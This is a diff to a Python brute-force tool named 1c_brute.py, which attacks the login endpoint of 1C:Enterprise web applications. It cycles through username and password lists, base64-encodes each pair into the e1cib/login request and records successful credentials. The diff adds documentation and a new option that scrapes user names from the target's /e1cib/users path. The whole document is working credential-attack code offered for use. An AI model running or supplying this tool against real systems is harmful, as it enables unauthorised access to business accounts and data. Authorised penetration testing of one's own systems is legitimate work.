@@ -15,52 +15,63 @@ logger = logging.getLogger(__name__)
 logging.basicConfig(level=logging.DEBUG)
 
 
-def parse_args() -> argparse:
+def print_logo():
+    pass
+
+
+def parse_args() -> argparse.Namespace:
+    """
+    Parse args for utility
+
+    :return: args
+    :rtype: argparse.Namespace
+    """
     parser = argparse.ArgumentParser(
-        description='Web Application Bruteforcer',
-        epilog='Example: py ./1c_brute.py <url> users.txt pass.txt'
+        description="1C Web interface bruteforce",
+        epilog="Example: python ./1c_brute.py"
+        "<url> <users_file> <passwords_file>"
         )
 
     parser.add_argument(
-        'Target',
-        metavar='target',
+        "Target",
+        metavar="target",
         type=str,
-        help="The target URI with directory of 1C webapp."
-        "Example: http://192.168.1.1/docCorp"
+        help="The target URI with directory of 1C webapp"
+        "Example: https://localhost/docCorp"
     )
 
     parser.add_argument(
-        'Username',
-        metavar='users',
+        "Username",
+        metavar="users",
         type=str,
-        help='The usernames list'
+        help="The usernames list"
     )
 
     parser.add_argument(
-        'Passwords',
-        metavar='passwords',
+        "Passwords",
+        metavar="passwords",
         type=str,
-        help='The passwords list'
+        help="The passwords list"
     )
 
     parser.add_argument(
         "--delay",
         type=int,
-        help='Time in milliseconds between each request',
+        help="Time in milliseconds between each request",
         default=5
     )
 
     parser.add_argument(
         "--startat",
         type=int,
-        help='Start at this line in the file',
+        help="Start at this line in the file",
         default=0
     )
 
     parser.add_argument(
         "--ignore-invalid-certificate",
-        action='store_true',
-        help='Ignore untrusted certs',
+        action="store_true",
+        help="Ignore untrusted certs",
         default=True
     )
 
@@ -78,6 +89,13 @@ def parse_args() -> argparse:
         default=False
     )
 
+    parser.add_argument(
+        "--get-users",
+        action="store_true",
+        help="Auto get and parse users from <target_url>/e1cib/users",
+        default=False
+    )
+
     args = parser.parse_args()
 
     return args
@@ -86,7 +104,9 @@ def parse_args() -> argparse:
 @dataclasses.dataclass()
 class ExploitConfig(object):
     """
+    Config with params for bruteforce
     """
+
     clnId: str = "84c3db7e-661b-9350-57ac-7164384e6c43"
     lang: str = "ru_RU"
     version: str = "8.3.18.1208"
@@ -99,6 +119,7 @@ class ExploitConfig(object):
     delay: int = 5
     ignoreBadCerts: bool = False
     check_empty_passwords: bool = False
+    get_users: bool = False
 
     reseturl: str = ""
     resetdata = {"root": "{}"}
@@ -112,6 +133,7 @@ class ExploitConfig(object):
         delay: int,
         ignoreBadCerts: bool,
         check_empty_passwords: bool,
+        get_users: bool,
         version: str
     ):
         self.target = target
@@ -121,6 +143,7 @@ class ExploitConfig(object):
         self.delay = delay
         self.ignoreBadCerts = ignoreBadCerts
         self.check_empty_passwords = check_empty_passwords
+        self.get_users = get_users
         self.version = version
 
         self.reseturl = f"{target}/{self.lang}/e1cib/logout"
@@ -134,10 +157,11 @@ class FileHandler(object):
     @staticmethod
     def load(filename: str) -> List[str]:
         """
+        Load strings from file
 
-        :param filename: _description_
+        :param filename: file data getting
         :type filename: str
-        :return: _description_
+        :return: list of strings
         :rtype: List[str]
         """
         data: List[str] = []
@@ -156,10 +180,11 @@ class FileHandler(object):
     @staticmethod
     def save_line(filename: str, data: str):
         """
+        Append string to the end of provided file
 
-        :param filename: _description_
+        :param filename: file for data saving
         :type filename: str
-        :param data: _description_
+        :param data: data to save
         :type data: str
         """
         try:
@@ -173,6 +198,7 @@ class FileHandler(object):
 
 class Exploit(object):
     """
+    Class for bruteforce
     """
     _config: ExploitConfig = None
     found_credentials: List[str] = []
@@ -185,7 +211,8 @@ class Exploit(object):
         startAt: int,
         delay: int,
         ignoreBadCerts: bool,
-        check_empty_passwords: bool
+        check_empty_passwords: bool,
+        get_users: bool
     ):
         version = self._determine_version()
 
@@ -197,30 +224,68 @@ class Exploit(object):
             delay=delay,
             ignoreBadCerts=ignoreBadCerts,
             check_empty_passwords=check_empty_passwords,
+            get_users=get_users,
             version=version
         )
 
+    def _get_users(self) -> List[str]:
+        """
+        Send request to get users
+
+        :return: list of users in system
+        :rtype: List[str]
+        """
+        url = f"{self._config.target}/e1cib/users"
+        users: List[str] = []
+        try:
+            request = requests.post(
+                url,
+                verify=not self._config.ignoreBadCerts
+            )
+            users = list(request.content)
+
+        except Exception as e:
+            logger.exception(
+                "[!] Unable to get users."
+                " Try again or provide users manually!"
+                f" {e}"
+            )
+            sys.exit(0)
+
+        return users
+
     def _prepare_cred(self, login: str, password: str = None) -> str:
+        """
+        Encode in base64 login and password for request
+
+        :param login: login for encoding
+        :type login: str
+        :param password: passwords for encoding, defaults to None
+        :type password: str, optional
+        :return: encoded cred
+        :rtype: str
+        """
         if self.config.check_empty_passwords:
             login += ""
             return base64.b64encode(
-                f'{login}'.encode('utf-8')
-            ).decode('utf-8')
+                f"{login}".encode("utf-8")
+            ).decode("utf-8")
 
         return base64.b64encode(
-            f'{login}:{password}'.encode('utf-8')
-        ).decode('utf-8')
+            f"{login}:{password}".encode("utf-8")
+        ).decode("utf-8")
 
     def _determine_version(self) -> str:
         return "8.3.18.1208"
 
-    def _brute(self, login, password):
+    def _brute(self, login: str, password: str):
         """
+        Send request with provided login and password
 
-        :param login: _description_
-        :type login: _type_
-        :param password: _description_
-        :type password: _type_
+        :param login: login to try
+        :type login: str
+        :param password: password to try
+        :type password: str
         """
         cred = self._prepare_cred(login, password)
         url = f"{self._config.target}/{self._config.lang}/e1cib/login?version={self._config.version}&cred={cred}&vl={self._config.lang}&clnId={self._config.clnId}"  # noqa
@@ -235,9 +300,9 @@ class Exploit(object):
                         f"\033[92m[+] Success: {login}:{password}\033[0m"
                     )
                     self.found_credentials.append(f"{login}:{password}")
-                    cookie = http.headers.get('Set-Cookie', '').split(';')[0]
+                    cookie = http.headers.get("Set-Cookie", "").split(";")[0]
                     if cookie:
-                        resetheader = {'Cookie': cookie}
+                        resetheader = {"Cookie": cookie}
                         requests.post(
                             self._config.reseturl,
                             headers=resetheader,
@@ -259,25 +324,33 @@ class Exploit(object):
 
         except requests.exceptions.RequestException as e:
             logging.exception(f"[!] Error: {e}")
-            pass
 
-    def start_exploit(self):
-        users = FileHandler.load(
-            filename=self._config.usernames_file
-        )[self._config.startAt:]
+    def start_exploit(self) -> List[str]:
+        """
+        Start bruteforce
+
+        :return: found credentials
+        :rtype: List[str]
+        """
+        if self._config.get_users:
+            users = self._get_users()
+        else:
+            users = FileHandler.load(
+                filename=self._config.usernames_file
+            )[self._config.startAt:]
+
+        logger.info(
+            f"Number of users: {len(users)}"
+        )
         if not users:
             logging.error(
-                "[!] There is no users provided. Shutting down..."
+                "[!] Users not provided. Shutting down..."
             )
             sys.exit(0)
 
         passwords = []
         if not self._config.check_empty_passwords:
             passwords = FileHandler.load(filename=self._config.passwords_file)
-
-        logger.info(
-            f"Number of users: {len(users)}"
-        )
         logger.info(
             f"Number of passwords: {len(passwords)}"
         )
@@ -313,9 +386,10 @@ def main():
         usernames_file=args.Username,
         passwords_file=args.Passwords,
         startAt=args.startat,
-        delay=args.delay / 1000,
+        delay=args.delay / 1000,  # from ms to s
         ignoreBadCerts=args.ignore_invalid_certificate,
-        check_empty_passwords=args.check_empty_passwords
+        check_empty_passwords=args.check_empty_passwords,
+        get_users=args.get_users
     )
 
     logging.info(
